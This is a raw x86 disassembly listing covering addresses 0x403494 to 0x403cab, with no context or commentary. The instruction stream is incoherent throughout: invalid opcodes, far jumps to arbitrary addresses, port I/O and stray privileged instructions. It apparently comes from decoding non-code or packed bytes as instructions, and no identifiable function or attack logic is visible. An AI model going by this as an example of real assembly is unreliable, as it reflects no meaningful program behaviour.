  403494:	stos   DWORD PTR es:[edi],eax
  403495:	inc    ecx
  403496:	or     DWORD PTR [ebp+0x62],edx
  403499:	and    DWORD PTR [ebx],edi
  40349b:	or     DWORD PTR [ebp*1-0x10118af7],0x4c
  4034a3:	or     BYTE PTR [ecx],bh
  4034a5:	jge    0x4034ef
  4034a7:	add    BYTE PTR [edx-0x70],ch
  4034aa:	add    eax,0xce37f400
  4034af:	inc    ebp
  4034b0:	cmc    
  4034b1:	mov    ds:0xfe94141,al
  4034b6:	pop    ebp
  4034b7:	or     BYTE PTR [ecx-0x24],al
  4034ba:	out    dx,eax
  4034bb:	add    cl,ch
  4034bd:	stos   DWORD PTR es:[edi],eax
  4034be:	mov    cl,0xff
  4034c0:	mov    esp,0x4607e126
  4034c5:	xor    eax,0x110309
  4034ca:	jb     0x403506
  4034cc:	call   0x1713bf
  4034d1:	jb     0x403548
  4034d3:	(bad)  
  4034d4:	jne    0x4034c7
  4034d6:	arpl   cx,sp
  4034d8:	adc    DWORD PTR [esi],ecx
  4034da:	sub    eax,0x2e94ff09
  4034df:	cmp    ch,al
  4034e1:	add    BYTE PTR [esi+0x30000ef],bl
  4034e7:	retf   0xc95b
  4034ea:	pop    edx
  4034eb:	add    eax,0xd9135500
  4034f0:	push   ebx
  4034f1:	or     DWORD PTR ds:0x57750005,0xffffffcf
  4034f8:	inc    ebp
  4034f9:	or     al,cl
  4034fb:	inc    edx
  4034fc:	inc    ecx
  4034fd:	add    bl,cl
  4034ff:	push   0xe15000c
  403504:	mov    DWORD PTR [ebp+0x5c],0x5841487a
  40350b:	mov    bh,0x75
  40350d:	or     BYTE PTR [eax-0x57],dh
  403510:	out    0x0,al
  403512:	dec    eax
  403513:	sbb    eax,0xffffffff
  403516:	inc    ebp
  403517:	stc    
  403518:	out    0xb3,eax
  40351a:	mov    dh,0x9
  40351c:	add    BYTE PTR [ebx],al
  40351e:	loopne 0x40356a
  403520:	push   ebx
  403521:	call   0x3fe7e9
  403526:	adc    DWORD PTR [edx+0x1b1075ff],0xffffffe8
  40352d:	mov    ebp,0x9b600
  403532:	call   ebp
  403534:	add    eax,0xeb92e853
  403539:	add    BYTE PTR [eax],al
  40353b:	pop    ecx
  40353c:	imul   ecx,DWORD PTR [eax],0x4c90b0
  403542:	je     0x403524
  403544:	mov    dh,0x75
  403546:	or     BYTE PTR [eax-0x59],ah
  403549:	sti    
  40354a:	(bad)  
  40354b:	inc    DWORD PTR [edx-0x37eea43d]
  403551:	or     BYTE PTR [eax],al
  403553:	jne    0x4034d7
  403555:	in     al,dx
  403556:	adc    DWORD PTR [esi+esi*4+0x57],0x68
  40355b:	xor    ebp,esp
  40355d:	add    al,0x0
  40355f:	xor    DWORD PTR [eax],ecx
  403561:	lods   eax,DWORD PTR ds:[esi]
  403562:	sti    
  403563:	xchg   esi,eax
  403564:	push   cs
  403565:	mov    WORD PTR [ebp-0x73],es
  403568:	bound  esp,QWORD PTR [eax]
  40356a:	out    0xfa,al
  40356c:	mov    al,ds:0xe2040003
  403571:	jmp    0x316a:0xe0347616
  403578:	cmp    al,BYTE PTR [edi+edi*8]
  40357b:	fsubr  st(7),st
  40357d:	imul   eax,DWORD PTR [eax],0x4be5dc5e
  403583:	lock fild WORD PTR [esi-0x22e83740]
  40358a:	jne    0x4035d1
  40358c:	(bad)  
  40358d:	imul   edi,ebx,0x45c5a63e
  403593:	add    BYTE PTR ds:0x310003df,dh
  403599:	xor    ebp,edx
  40359b:	dec    ebx
  40359c:	jo     0x403580
  40359e:	call   0x891bdfd0
  4035a3:	inc    ebp
  4035a4:	sub    ebp,eax
  4035a6:	fdivr  QWORD PTR [edi+0xe]
  4035a9:	push   esp
  4035aa:	sbb    eax,DWORD PTR [edx+0x2d]
  4035ad:	aad    0xf8
  4035af:	imul   esi,DWORD PTR [ecx],0x61084235
  4035b5:	mov    edx,0xe2704d15
  4035ba:	fdiv   QWORD PTR [edx]
  4035bc:	fst    DWORD PTR [esi-0x18210023]
  4035c2:	ret    
  4035c3:	je     0x4035f1
  4035c5:	pop    ecx
  4035c6:	inc    edi
  4035c7:	cld    
  4035c8:	fcmovu st,st(2)
  4035ca:	add    bh,0x2d
  4035cd:	pop    edi
  4035ce:	sbb    eax,0x88f44400
  4035d3:	inc    ebp
  4035d4:	mov    ch,0x9
  4035d6:	(bad)  
  4035d7:	retf   0xd73
  4035da:	jmp    0xbb25f015
  4035df:	mov    ah,dh
  4035e1:	add    dl,ah
  4035e3:	ret    
  4035e4:	sbb    eax,0x311c690e
  4035e9:	pop    esi
  4035ea:	repz fwait
  4035ec:	xor    DWORD PTR [ecx],ecx
  4035ee:	jmp    0x2c020ff6
  4035f3:	or     BYTE PTR [ecx],dh
  4035f5:	pop    edi
  4035f6:	jmp    0x5f713664
  4035fb:	jmp    0xb16b:0xe95f3169
  403602:	or     ecx,ebp
  403604:	add    edx,DWORD PTR [esi+0x5e]
  403607:	icebp  
  403608:	jmp    0x40358b
  40360a:	out    dx,al
  40360b:	jmp    0x2f1f013
  403610:	(bad)  
  403611:	repnz pop esp
  403613:	loop   0x403645
  403615:	dec    ecx
  403616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403617:	mov    WORD PTR [ebx],es
  403619:	xor    DWORD PTR [ecx+0x93103e8],edx
  40361f:	xor    cl,bl
  403621:	repz or al,0xe9
  403624:	ss stos BYTE PTR es:[edi],al
  403626:	in     al,0x72
  403628:	inc    esi
  403629:	cmp    DWORD PTR [eax],eax
  40362b:	test   eax,0xb1892c57
  403630:	add    eax,DWORD PTR [edx+eax*1+0x9310331]
  403637:	jmp    0xe94d2a06
  40363c:	fcomp  QWORD PTR [ecx+eax*1+0x41]
  403640:	cwde   
  403641:	aam    0x8
  403643:	jmp    0xbe140fc8
  403648:	push   cs
  403649:	cwde   
  40364a:	clc    
  40364b:	call   0x446753
  403650:	pop    esp
  403651:	repnz add esi,DWORD PTR [esi-0x47f236d7]
  403658:	jmp    0x30403f8f
  40365d:	add    BYTE PTR [eax+0xc],dh
  403660:	add    BYTE PTR [ecx+ebp*4+0x762583e4],bh
  403667:	pop    esi
  403668:	add    BYTE PTR [ebx-0xe8a2bce],dl
  40366e:	call   0xc000:0x32e9e57c
  403675:	jne    0x4036bf
  403677:	cmp    DWORD PTR [eax-0x2f],edx
  40367a:	out    dx,eax
  40367b:	into   
  40367c:	(bad)  
  40367d:	fidiv  WORD PTR [ebp+ecx*2-0x2bdace04]
  403684:	jne    0x403653
  403686:	jp     0x4036e5
  403688:	or     cl,dl
  40368a:	in     al,dx
  40368b:	in     eax,dx
  40368c:	add    cl,ch
  40368e:	aaa    
  40368f:	leave  
  403690:	jne    0x403677
  403692:	pop    ebx
  403693:	pop    ebp
  403694:	cld    
  403695:	rcl    edx,0xce
  403698:	jmp    DWORD PTR [esi-0x151436a2]
  40369e:	mov    bh,0x4c
  4036a0:	cld    
  4036a1:	mov    al,ds:0x34000df7
  4036a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036a7:	in     eax,0x53
  4036a9:	jb     0x4036f3
  4036ab:	add    eax,0xe13fd96a
  4036b0:	jnp    0x403725
  4036b2:	fcmovbe st,st(2)
  4036b4:	push   0xffffffe9
  4036b6:	test   BYTE PTR [ecx],cl
  4036b8:	push   0xffffffea
  4036ba:	pop    esp
  4036bb:	or     DWORD PTR [edx-0x16],ebp
  4036be:	pop    edx
  4036bf:	or     DWORD PTR [eax],eax
  4036c1:	jmp    0x7612e8c6
  4036c6:	loope  0x403692
  4036c8:	fucom  st(4)
  4036ca:	add    al,bl
  4036cc:	push   es
  4036cd:	mov    DWORD PTR [ebx],eax
  4036cf:	cwde   
  4036d0:	inc    edx
  4036d1:	pop    esp
  4036d2:	push   0xffffffc8
  4036d4:	push   ss
  4036d5:	call   0x4da40f
  4036da:	mov    ebx,ebx
  4036dc:	or     ch,BYTE PTR [edx+0x0]
  4036df:	ret    0x6a06
  4036e2:	add    BYTE PTR [edx+0x27006a0c],dh
  4036e8:	cli    
  4036e9:	out    0x27,eax
  4036eb:	cmp    eax,0x580b000d
  4036f0:	cmp    DWORD PTR [edi],ebp
  4036f2:	mov    ebx,ecx
  4036f4:	shr    BYTE PTR [ecx+0x0],cl
  4036f7:	mov    dl,0x6
  4036f9:	push   0x0
  4036fb:	add    cl,BYTE PTR [ecx]
  4036fd:	push   eax
  4036fe:	call   0x411f33
  403703:	ror    DWORD PTR [edx+0x8],1
  403706:	or     ecx,DWORD PTR [eax+0xbff2439]
  40370c:	or     eax,ebp
  40370e:	mov    ebx,0xff00066c
  403713:	cmp    ebx,esi
  403715:	mov    ah,0xe4
  403717:	dec    eax
  403718:	push   es
  403719:	mov    DWORD PTR [ebx],0xffffaed7
  40371f:	ret    
  403720:	add    bh,bh
  403722:	xor    esi,DWORD PTR [eax+0xe4a8]
  403728:	or     bh,al
  40372a:	add    edi,edi
  40372c:	mov    bh,0xae
  40372e:	jmp    FWORD PTR [ebx]
  403730:	fdiv   st,st(4)
  403732:	inc    edx
  403733:	or     BYTE PTR [edi],dl
  403735:	pop    ecx
  403736:	rcr    BYTE PTR [ebx-0x2f],0xcb
  40373a:	or     BYTE PTR [eax],al
  40373c:	lods   eax,DWORD PTR ds:[esi]
  40373d:	sub    ah,0x53
  403740:	arpl   WORD PTR [ecx],dx
  403742:	or     BYTE PTR [ebx+0x74daf731],al
  403748:	ds inc ebx
  40374a:	push   esi
  40374b:	or     cl,bl
  40374d:	in     eax,dx
  40374e:	fiadd  WORD PTR [eax]
  403750:	xor    DWORD PTR [ebx],edx
  403752:	push   esi
  403753:	add    al,0xc9
  403755:	xchg   ecx,eax
  403756:	fild   WORD PTR [eax]
  403758:	xor    DWORD PTR [ebx],esp
  40375a:	push   ss
  40375b:	call   0x433b7e
  403760:	or     bl,BYTE PTR [ecx]
  403762:	lds    eax,FWORD PTR [ecx+esi*1]
  403765:	xchg   ebp,eax
  403766:	mov    gs,esp
  403768:	mov    al,0x2b
  40376a:	jecxz  0x40375b
  40376c:	mov    cs,WORD PTR [edx]
  40376e:	xor    DWORD PTR [edi-0x4e],edx
  403771:	xchg   esp,eax
  403772:	xor    DWORD PTR [eax-0x10],ecx
  403775:	fild   WORD PTR [ebx]
  403777:	je     0x403795
  403779:	jecxz  0x40378a
  40377b:	push   esi
  40377c:	stc    
  40377d:	and    BYTE PTR [eax+ebp*8],al
  403780:	mov    al,0xe8
  403782:	fcos   
  403784:	jbe    0x40376a
  403786:	xor    DWORD PTR [eax-0x10],ecx
  403789:	fild   WORD PTR [ebx]
  40378b:	add    BYTE PTR [eax],al
  40378d:	xor    eax,esp
  40378f:	test   BYTE PTR ds:0x4317eb,bh
  403795:	xor    DWORD PTR [edi+ebp*8],edx
  403798:	(bad)  
  403799:	cld    
  40379a:	cmc    
  40379b:	dec    ebx
  40379c:	inc    ecx
  40379d:	xor    DWORD PTR [edx+0x65],edi
  4037a0:	stc    
  4037a1:	es jo  0x403765
  4037a4:	add    eax,0x432a7b
  4037a9:	xor    edx,esp
  4037ab:	add    eax,DWORD PTR [eax]
  4037ad:	mov    esp,0x6efd45d
  4037b2:	push   eax
  4037b3:	xor    al,0xe8
  4037b5:	int3   
  4037b6:	push   edx
  4037b7:	fcos   
  4037b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037ba:	gs call 0x664a26af
  4037c0:	xor    al,0xd9
  4037c2:	stos   BYTE PTR es:[edi],al
  4037c3:	pop    ecx
  4037c4:	(bad)  
  4037c6:	jle    0x403774
  4037c8:	xlat   BYTE PTR ds:[ebx]
  4037c9:	and    DWORD PTR [ecx-0x51],0xd109704b
  4037d0:	add    eax,0xec690931
  4037d5:	push   ecx
  4037d6:	out    0xe9,al
  4037d8:	add    ebp,DWORD PTR [edx]
  4037da:	leave  
  4037db:	fidivr WORD PTR [esi+0xa]
  4037de:	or     ch,cl
  4037e0:	add    ebp,DWORD PTR [esi-0x7a]
  4037e3:	adc    eax,0xe9d09ee9
  4037e8:	add    esi,DWORD PTR [ecx]
  4037ea:	or     DWORD PTR [esi],esp
  4037ec:	jg     0x403777
  4037ee:	loopne 0x4037f6
  4037f0:	fld    DWORD PTR [eax]
  4037f2:	xchg   BYTE PTR [eax],al
  4037f4:	jmp    0x834942fc
  4037f9:	add    ecx,DWORD PTR [ebx]
  4037fb:	or     DWORD PTR [ebx-0x1e7943fd],eax
  403801:	call   0x877a086c
  403806:	mov    ah,0xcd
  403808:	(bad)  
  403809:	fcom   DWORD PTR [esi+0x39]
  40380c:	into   
  40380d:	mov    es,WORD PTR [ebp-0x20]
  403810:	(bad)  
  403811:	fadd   DWORD PTR [esi+0x56]
  403814:	mov    ebp,0xe9e617eb
  403819:	add    ebp,DWORD PTR [edx]
  40381b:	leave  
  40381c:	fidivr WORD PTR [esi+0x42]
  40381f:	or     ch,cl
  403821:	add    ebx,DWORD PTR [ecx+0x3143319f]
  403827:	popa   
  403828:	aaa    
  403829:	dec    esp
  40382a:	jo     0x403835
  40382c:	adc    DWORD PTR [ecx+0xd],0xf10c86d0
  403833:	jmp    DWORD PTR [edx+edx*8+0x31]
  403837:	or     DWORD PTR [eax],eax
  403839:	jmp    0x64cdf0e3
  40383e:	push   es
  40383f:	loopne 0x403840
  403841:	data16 and bh,BYTE PTR [ebx]
  403844:	call   0x103ee3
  403849:	loop   0x40383d
  40384b:	inc    DWORD PTR [ebx+0x93233]
  403851:	jo     0x40389a
  403853:	jmp    0xd9407747
  403858:	jge    0x4037df
  40385a:	inc    ecx
  40385b:	leave  
  40385c:	iret   
  40385d:	call   FWORD PTR [ecx-0x57b784e6]
  403863:	xor    dl,al
  403865:	mov    ch,0x9
  403867:	mov    edi,ecx
  403869:	inc    DWORD PTR [ecx+0x6900092c]
  40386f:	call   0xc003:0x6906fb9e
  403876:	out    dx,al
  403877:	(bad)  
  403878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403879:	add    cl,ch
  40387b:	xor    cl,BYTE PTR [eax+edi*8-0x6378c618]
  403882:	jmp    0xde9041b9
  403887:	shl    al,0xef
  40388a:	(bad)  
  40388b:	jle    0x4038c5
  40388d:	call   DWORD PTR [ebp+eiz*2+0x55c6ffdf]
  403894:	adc    ch,dh
  403896:	mov    esi,0xc1857d66
  40389b:	dec    esi
  40389c:	iret   
  40389d:	call   FWORD PTR [ecx]
  40389f:	popf   
  4038a0:	stos   DWORD PTR es:[edi],eax
  4038a1:	dec    eax
  4038a2:	sub    BYTE PTR ds:0x1689b5ce,ch
  4038a8:	iret   
  4038a9:	inc    DWORD PTR [ecx]
  4038ab:	xor    ecx,DWORD PTR [ecx]
  4038ad:	add    BYTE PTR [ecx+0x1d],ch
  4038b0:	pusha  
  4038b1:	sti    
  4038b2:	add    BYTE PTR [edi+0x4c00bb6],ch
  4038b8:	jae    0xe6f0397b
  4038be:	(bad)  
  4038bf:	(bad)  
  4038c0:	fnstcw WORD PTR [ebx+edi*1]
  4038c3:	push   eax
  4038c4:	test   al,0x81
  4038c6:	test   esp,edi
  4038c8:	outs   dx,DWORD PTR ds:[esi]
  4038c9:	mov    dh,0xff
  4038cb:	push   eax
  4038cc:	jo     0x4038a2
  4038ce:	loop   0x4038d0
  4038d0:	fcomp  DWORD PTR [edx]
  4038d2:	lea    eax,[ebp-0x1994]
  4038d8:	cwde   
  4038d9:	mov    bh,0xb5
  4038db:	in     al,dx
  4038dc:	outs   dx,DWORD PTR ds:[esi]
  4038dd:	mov    dh,0xff
  4038df:	call   0x3ff252
  4038e4:	jo     0x40389d
  4038e6:	mov    ch,0xe8
  4038e8:	das    
  4038e9:	mov    dh,0xff
  4038eb:	push   eax
  4038ec:	aas    
  4038ed:	js     0x4038db
  4038ef:	out    dx,eax
  4038f0:	aas    
  4038f1:	mov    dh,0xe8
  4038f3:	fild   DWORD PTR [edi+esi*4-0x4da71701]
  4038fa:	(bad)  
  4038fb:	push   DWORD PTR [ebx]
  4038fd:	and    eax,0xe75c858d
  403902:	(bad)  
  403903:	jmp    FWORD PTR [eax]
  403905:	fstp   st(0)
  403907:	loop   0x403951
  403909:	or     al,BYTE PTR [eax+0x50]
  40390c:	int    0x88
  40390e:	cld    
  40390f:	out    dx,eax
  403910:	jg     0x4038c9
  403912:	push   eax
  403913:	inc    ebp
  403915:	in     eax,0xef
  403917:	(bad)  
  403918:	jg     0x4038fc
  40391a:	mov    ah,0xf4
  40391c:	jg     0x4038d5
  40391e:	call   0xb7273a0c
  403923:	(bad)  
  403924:	inc    DWORD PTR [ebp-0x40001016]
  40392a:	loope  0x40390a
  40392c:	div    DWORD PTR [ecx]
  40392e:	ja     0x403906
  403930:	push   DWORD PTR [ebx+esi*2+0x7906ffe6]
  403937:	mov    ?,esi
  403939:	dec    BYTE PTR [esi-0x2a]
  40393c:	jne    0x403933
  40393e:	xchg   esi,ecx
  403940:	jecxz  0x403973
  403942:	loopne 0x4039ad
  403944:	add    dh,ah
  403946:	ins    BYTE PTR es:[edi],dx
  403947:	shr    edi,cl
  403949:	fisubr WORD PTR [esi]
  40394b:	jmp    0x4039bc
  40394d:	fnsave [esi]
  40394f:	(bad)  
  403950:	push   0x31
  403952:	aas    
  403953:	nop
  403954:	in     al,dx
  403955:	(bad)  
  403956:	inc    esi
  403957:	(bad)  
  403958:	call   0x164db0
  40395d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40395e:	pop    esp
  40395f:	fucomip st,st(7)
  403961:	scas   al,BYTE PTR es:[edi]
  403962:	push   ds
  403963:	xor    edi,edi
  403965:	fsub   st(7),st
  403967:	in     eax,0xff
  403969:	sahf   
  40396a:	idiv   DWORD PTR [ecx-0x1d]
  40396d:	xor    eax,esp
  40396f:	add    al,0x9
  403972:	stos   DWORD PTR es:[edi],eax
  403973:	(bad)  
  403974:	mov    ch,0x81
  403976:	not    ch
  403978:	dec    DWORD PTR [ecx+0x76ffe67b]
  40397e:	push   0xde5ee880
  403983:	aad    0xff
  403985:	add    BYTE PTR [edi+esi*4-0x48a1001b],bl
  40398c:	outs   dx,BYTE PTR ds:[esi]
  40398d:	not    DWORD PTR [esi-0x4a]
  403990:	mov    eax,ds:0x420f956
  403995:	(bad)  
  403996:	jl     0x403953
  403998:	in     eax,0xff
  40399a:	ds mov bh,0x49
  40399d:	loop   0x4039d0
  40399f:	loopne 0x4039a9
  4039a1:	shl    BYTE PTR [ebp+0x198d88b7],0xa
  4039a8:	xchg   esi,eax
  4039a9:	aad    0x1e
  4039ab:	sbb    DWORD PTR [ecx+0x21335489],0x45d83143
  4039b5:	aad    0xbc
  4039b7:	in     eax,0x96
  4039b9:	aad    0xfe
  4039bb:	loope  0x403978
  4039bd:	loope  0x4039f0
  4039bf:	or     DWORD PTR [edi+edi*2-0x2b],esp
  4039c3:	fsubr  QWORD PTR [esi-0x2b]
  4039c6:	or     esp,0xcccee89c
  4039cc:	pop    esi
  4039cd:	in     al,dx
  4039ce:	sbb    ebp,eax
  4039d0:	jmp    0xd209edd8
  4039d5:	dec    eax
  4039d6:	(bad)  
  4039d7:	xchg   esi,eax
  4039d8:	push   ebp
  4039d9:	in     eax,0xbe
  4039db:	int3   
  4039dc:	push   ecx
  4039dd:	or     esi,eax
  4039df:	int3   
  4039e0:	mov    esi,DWORD PTR ss:[ecx+eiz*8-0x33592ac2]
  4039e8:	pop    esp
  4039e9:	in     al,dx
  4039ea:	add    BYTE PTR [esi+0x5cec1ecc],cl
  4039f0:	aam    0x16
  4039f2:	aad    0xd2
  4039f4:	das    
  4039f5:	mov    eax,ds:0x3ccc3142
  4039fa:	loopne 0x40398a
  4039fc:	int3   
  4039fd:	(bad)  
  4039fe:	jmp    0x40398b
  403a00:	jmp    0xf875:0xc93a03e9
  403a07:	mov    ebx,0x5ee4d17e
  403a0c:	int3   
  403a0d:	jb     0x4039e2
  403a0f:	stos   BYTE PTR es:[edi],al
  403a10:	push   cs
  403a11:	xor    ecx,DWORD PTR [eax+esi*8+0x8]
  403a15:	ficomp DWORD PTR [edi-0x1b3269ba]
  403a1b:	ds int3 
  403a1d:	shl    DWORD PTR [edx-0x16fff6b0],1
  403a23:	add    eax,0xfdbef096
  403a28:	retf   
  403a29:	call   0xc5138
  403a2e:	sahf   
  403a2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a30:	fsub   st(7),st
  403a32:	xchg   esi,eax
  403a33:	in     eax,0xe0
  403a35:	pop    eax
  403a36:	jg     0x403a15
  403a38:	retf   
  403a39:	pop    edi
  403a3a:	daa    
  403a3b:	jmp    0x85f:0xe7255c7
  403a42:	adc    eax,0xb96effd2
  403a48:	mov    eax,0x40c11cff
  403a4d:	inc    ecx
  403a4e:	jmp    0xff46e753
  403a53:	fdivr  QWORD PTR [edx]
  403a55:	jl     0x403a99
  403a57:	in     eax,0xbb
  403a59:	cmc    
  403a5a:	mov    bl,0xb1
  403a5c:	jae    0x403a67
  403a5e:	leave  
  403a5f:	sub    esi,DWORD PTR [esi-0x699dab35]
  403a65:	xchg   esp,eax
  403a67:	xor    DWORD PTR [ebp-0x3c],edx
  403a6a:	inc    ebp
  403a6b:	and    DWORD PTR [edx],esi
  403a6d:	or     DWORD PTR [eax],eax
  403a6f:	jmp    0xe9488825
  403a74:	(bad)  
  403a75:	idiv   dh
  403a77:	xchg   esp,eax
  403a78:	cs int3 
  403a7a:	jne    0x403a6d
  403a7c:	or     BYTE PTR [ecx],cl
  403a7e:	call   0xb937f
  403a83:	pusha  
  403a84:	das    
  403a85:	int    0xeb
  403a87:	out    0xa5,al
  403a89:	inc    ebp
  403a8a:	cld    
  403a8b:	jmp    0x724043c2
  403a90:	inc    eax
  403a91:	xchg   ebp,eax
  403a92:	dec    eax
  403a93:	sub    BYTE PTR ds:0xf86213e0,dh
  403a99:	int3   
  403a9a:	cmp    eax,DWORD PTR [eax]
  403a9c:	lmsw   WORD PTR [ebp+0x9]
  403aa0:	pop    DWORD PTR [ecx-0x8]
  403aa3:	add    DWORD PTR [eax],ebx
  403aa5:	pop    es
  403aa6:	add    bl,ch
  403aa8:	push   cs
  403aa9:	dec    esp
  403aaa:	aas    
  403aab:	or     edx,edi
  403aad:	xor    cl,ch
  403aaf:	xor    DWORD PTR ds:0x7500bd,0x10
  403ab6:	mov    eax,0x83b0fc75
  403abb:	(bad)  
  403abc:	push   DWORD PTR [edi+0x17f8454a]
  403ac2:	mov    edx,es
  403ac4:	or     al,bl
  403ac6:	jnp    0x414d5709
  403acc:	add    BYTE PTR [ebx+0x378b56cd],al
  403ad2:	lods   eax,DWORD PTR ds:[esi]
  403ad3:	mul    BYTE PTR ds:[edi-0x4a]
  403ad7:	or     edi,edi
  403ad9:	fnsave [edx+0xd3c05c7]
  403adf:	inc    ecx
  403ae0:	add    al,cl
  403ae2:	push   es
  403ae3:	add    BYTE PTR [eax],al
  403ae5:	mov    ebx,0xe648b55
  403aeb:	push   esi
  403aec:	push   0xffffff88
  403aee:	mov    bh,0x75
  403af0:	or     BYTE PTR [eax+0x77],al
  403af3:	stc    
  403af4:	jmp    DWORD PTR [edi]
  403af6:	dec    edx
  403af7:	clc    
  403af8:	call   FWORD PTR [ebp+0x28ebe7ce]
  403afe:	add    eax,0x4308300
  403b03:	jbe    0x403b14
  403b05:	iret   
  403b06:	xchg   BYTE PTR [edi],bh
  403b08:	and    bl,ch
  403b0a:	int    0xfb
  403b0c:	(bad)  
  403b0d:	inc    DWORD PTR [ebx]
  403b0f:	mov    ecx,eax
  403b11:	jnp    0x403ab5
  403b13:	pop    edi
  403b14:	push   0x413b7831
  403b19:	add    BYTE PTR [ecx],dh
  403b1b:	adc    ebx,esp
  403b1d:	push   0x53
  403b1f:	loopne 0x403b24
  403b21:	or     esi,DWORD PTR [ecx+0x14]
  403b24:	or     dh,al
  403b26:	jno    0x403b04
  403b28:	add    ebp,DWORD PTR [edx-0x7b]
  403b2b:	inc    esi
  403b2c:	add    al,0x57
  403b2e:	or     DWORD PTR [edx-0x1a],eax
  403b31:	add    BYTE PTR [ecx],dh
  403b33:	xlat   BYTE PTR ds:[ebx]
  403b34:	ret    
  403b35:	je     0x403b6b
  403b37:	call   0x7c9:0xdf1a0003
  403b3e:	xor    ebx,ebp
  403b40:	fld    TBYTE PTR [eax-0x7cfc1fef]
  403b46:	jmp    0xef439629
  403b4b:	loop   0x403b50
  403b4d:	mov    esi,esi
  403b4f:	shl    DWORD PTR [edx],0xc9
  403b52:	repz jecxz 0x403b58
  403b55:	push   ebp
  403b56:	mov    edx,0xc5c48643
  403b5b:	dec    ax
  403b5d:	or     al,0x34
  403b5f:	loopne 0x403b54
  403b61:	push   DWORD PTR [esi-0x5b3a2491]
  403b67:	adc    dl,dl
  403b69:	mov    esp,ebp
  403b6b:	sbb    edx,edx
  403b6d:	jne    0x403b9c
  403b6f:	and    ebx,DWORD PTR [eax-0x4]
  403b72:	xchg   esi,eax
  403b73:	je     0x403b70
  403b75:	out    0x9a,eax
  403b77:	in     al,dx
  403b78:	sar    edi,1
  403b7a:	xchg   BYTE PTR [ebx+esi*8-0x2],dh
  403b7e:	add    BYTE PTR [esp+edx*8],al
  403b81:	shl    BYTE PTR [ebp+0x75],cl
  403b84:	mul    DWORD PTR [ecx+ecx*1+0x75d2e031]
  403b8b:	gs pop es
  403b8d:	mov    dh,ch
  403b8f:	pop    esi
  403b90:	or     dh,ah
  403b92:	mov    ebx,0x36e8fc73
  403b97:	mov    edx,0xde353fdc
  403b9c:	leave  
  403b9d:	push   esp
  403b9e:	cld    
  403b9f:	push   esi
  403ba0:	outs   dx,DWORD PTR ds:[esi]
  403ba1:	leave  
  403ba2:	add    al,0x31
  403ba4:	jns    0x403b98
  403ba6:	ret    
  403ba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ba8:	adc    BYTE PTR [esi],dl
  403baa:	sub    eax,0xfcabd287
  403baf:	push   ds
  403bb0:	xchg   esp,eax
  403bb1:	and    al,0xfc
  403bb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bb4:	xchg   esp,eax
  403bb5:	shl    DWORD PTR [edx+edi*4+0x3e],0xe5
  403bba:	sbb    al,0xf1
  403bbc:	lds    edx,FWORD PTR [eax-0x2f]
  403bbf:	dec    al
  403bc1:	xchg   BYTE PTR [ebx+eax*1+0x78],dh
  403bc5:	pop    ecx
  403bc6:	test   BYTE PTR [esi],ch
  403bc8:	or     ebp,edi
  403bca:	jmp    0x9d1:0x53815c7f
  403bd1:	jmp    0xe67ed2d2
  403bd6:	xor    BYTE PTR [edx+0x67],ch
  403bd9:	and    dh,al
  403bdb:	cmp    DWORD PTR [ecx],ecx
  403bdd:	pusha  
  403bde:	or     dh,BYTE PTR [edx+0xdcedcf]
  403be4:	fild   WORD PTR [ecx+0x93103e8]
  403bea:	xchg   esi,eax
  403beb:	sub    al,0x7
  403bed:	shr    BYTE PTR [ebx],cl
  403bef:	cld    
  403bf0:	sahf   
  403bf1:	xor    BYTE PTR [ebp-0x6ef70fc4],cl
  403bf7:	inc    edx
  403bf8:	clc    
  403bf9:	dec    ecx
  403bfa:	jmp    0xf08dada
  403bff:	ror    DWORD PTR [ecx],1
  403c01:	jne    0x403bb5
  403c03:	inc    edx
  403c04:	xor    DWORD PTR [ecx],esi
  403c06:	pop    ebx
  403c07:	lock or BYTE PTR ds:[eax],al
  403c0b:	add    ebp,esp
  403c0d:	(bad)  
  403c0e:	(bad)  
  403c0f:	out    dx,al
  403c10:	cli    
  403c11:	xor    BYTE PTR [ebx+0x28],cl
  403c14:	sub    eax,0xf2305b31
  403c19:	or     al,ch
  403c1b:	push   eax
  403c1c:	pusha  
  403c1d:	enter  0x41ff,0x4b
  403c21:	push   esp
  403c22:	inc    ecx
  403c23:	jmp    0x288c0d02
  403c28:	xor    eax,0x1b66ab1
  403c2d:	enter  0xd68,0x5c
  403c31:	dec    edx
  403c32:	add    BYTE PTR [ecx],dl
  403c34:	sbb    edx,DWORD PTR [ecx+0x41]
  403c37:	jmp    0x973fa026
  403c3c:	loope  0x403c6e
  403c3e:	push   esp
  403c3f:	and    dh,BYTE PTR [edx+0x9]
  403c42:	push   0x4a3a9f
  403c47:	xchg   ecx,eax
  403c48:	add    BYTE PTR [esi],ch
  403c4a:	enter  0x76ff,0x8a
  403c4e:	leave  
  403c4f:	dec    ebx
  403c50:	sub    BYTE PTR ds:0x73b21431,dh
  403c56:	or     eax,ebp
  403c58:	sbb    al,0xe0
  403c5a:	(bad)  
  403c5b:	inc    ecx
  403c5d:	out    dx,al
  403c5e:	push   ebx
  403c5f:	inc    ecx
  403c60:	jmp    0xa88b37bf
  403c65:	xor    dh,BYTE PTR [ecx-0x387ec1d2]
  403c6b:	ret    
  403c6c:	pushf  
  403c6d:	and    eax,0x9aa48bb5
  403c72:	adc    al,al
  403c74:	popf   
  403c75:	das    
  403c76:	mov    DWORD PTR [eax],edi
  403c78:	jmp    0xe9f84e64
  403c7d:	xor    cl,BYTE PTR [ecx]
  403c7f:	add    BYTE PTR [eax],ah
  403c81:	je     0x403c8f
  403c83:	add    BYTE PTR [eax],al
  403c85:	arpl   WORD PTR [ebp-0x15],di
  403c88:	pop    ss
  403c89:	fcom   DWORD PTR [ebx]
  403c8b:	pop    esp
  403c8c:	je     0x403ce3
  403c8e:	mov    edi,DWORD PTR [eax]
  403c90:	das    
  403c91:	in     eax,0x10
  403c93:	mov    edx,0xb4801
  403c98:	jmp    0x403cef
  403c9a:	xchg   ecx,eax
  403c9b:	add    BYTE PTR [eax],al
  403c9d:	pop    eax
  403c9e:	or     eax,DWORD PTR [eax-0x80]
  403ca1:	and    BYTE PTR ds:0xcac3e475,cl
  403ca7:	leave  
  403ca8:	ret    0xb14
  403cab:	push   ebp
